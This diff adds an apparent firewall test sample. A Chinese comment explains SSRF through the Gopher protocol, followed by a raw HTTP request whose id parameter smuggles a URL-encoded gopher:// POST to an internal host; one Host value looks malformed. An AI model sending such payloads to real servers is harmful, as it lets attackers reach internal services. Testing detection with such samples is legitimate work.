@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_Gopher协议_Http
+# Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。gopher协议支持发送http请求，可以先截获get请求包和post请求包，构成符合gopher协议的请求。
+GET /?id=gopher:%2F%2F192.168.0.109:80%2F_POST%2520%2Fssrf%2Fpost.php%2520HTTP%2F1.1%250d%250aHost:192.168.0.1090d%250a%250d%250aname=test%250d%250a&bid=hd_tag_m8mv24j1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24j1
+RM-PRO-Token: b579cec97157826902b6afa2c17efa48
+RM-PRO-Time: 1742808385560
+User-Agent: curl/7.83.1
+
